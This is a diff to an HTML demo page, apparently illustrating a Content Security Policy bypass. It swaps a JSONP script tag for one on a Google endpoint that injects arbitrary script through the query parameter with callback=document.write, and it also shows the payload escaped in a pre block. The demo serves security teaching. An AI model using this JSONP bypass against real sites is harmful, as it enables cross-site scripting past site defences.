@@ -50,9 +50,9 @@
       <img src="https://place-puppy.com/700x700">
 
       <!-- Trusted whitelist domain with JSONP endpoint -->
-      <script src="https://www.google.com/complete/search?client=chrome&q=concur&callback=alert"></script>
+      <script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert('arbitrary xss')</script>&callback=document.write"></script>
     </li>
-    <pre>&lt;script src&equals;&quot;https&colon;&sol;&sol;www&period;google&period;com&sol;complete&sol;search&quest;client&equals;chrome&amp;q&equals;concur&amp;callback&equals;alert&quot;&gt;&lt;&sol;script&gt;</pre>
+    <pre>&lt;script src&equals;&quot;https&colon;&sol;&sol;apis&period;google&period;com&sol;complete&sol;search&quest;client&equals;chrome&amp;q&equals;&lt;script&gt;alert&lpar;&apos;arbitrary xss&apos;&rpar;&lt;&sol;script&gt;&amp;callback&equals;document&period;write&quot;&gt;&lt;&sol;script&gt;</pre>
   </ol>
   <button id="counter">Count the how many good boys are there!</button>
   <pre>&lt;script&gt;&NewLine;  const numberOfDogs &equals; document&period;querySelectorAll&lpar;&apos;li&apos;&rpar;&period;length&semi;&NewLine;  document&period;getElementById&lpar;&quot;counter&quot;&rpar;&NewLine;    &period;addEventListener&lpar;&quot;click&quot;&comma; &lpar;&rpar; &equals;&gt; alert&lpar;&grave;There are &dollar;&lcub;numberOfDogs&rcub; dogs in the list&period;&grave;&rpar;&rpar;&semi;&NewLine;&lt;&sol;script&gt;</pre>
